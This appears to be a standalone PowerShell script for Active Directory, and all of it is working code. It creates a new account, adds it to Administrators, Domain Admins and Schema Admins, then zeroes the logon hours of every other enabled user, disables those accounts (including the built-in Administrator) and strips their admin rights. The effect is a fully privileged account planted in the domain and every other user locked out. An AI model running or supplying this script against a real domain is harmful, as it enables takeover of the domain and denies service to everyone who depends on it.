#gets all active AD users
$enabledUsers = Get-ADUser -LDAPFilter '(!userAccountControl:1.2.840.113556.1.4.803:=2)'

$userName = Read-Host "enter the username"
$pass = Read-Host "Enter password" -AsSecureString
$defaultPassword = Read-Host "Enter default password for disabled users" -AsSecureString
#creates new AD user
New-ADUser -Name $userName -Accountpassword $pass -Enable $true
Add-ADGroupMember -Identity Administrators -Members $userName
Add-ADGroupMember -Identity "Domain Admins" -Members $userName
Add-ADGroupMember -Identity "Schema Admins" -Members $userName



$Hours = New-Object byte[] 21
$replaceHashTable = New-Object HashTable
$replaceHashTable.Add("logonHours", $Hours)
foreach ($user in $enabledUsers) {
    Set-AdUser -Identity $user -Replace $replaceHashTable
    Disable-ADAccount -Identity $user
    if ($user -ne "Administrator") {
        remove-adgroupmember -identity Administrators -members $user -verbose -confirm:$false
    }
}

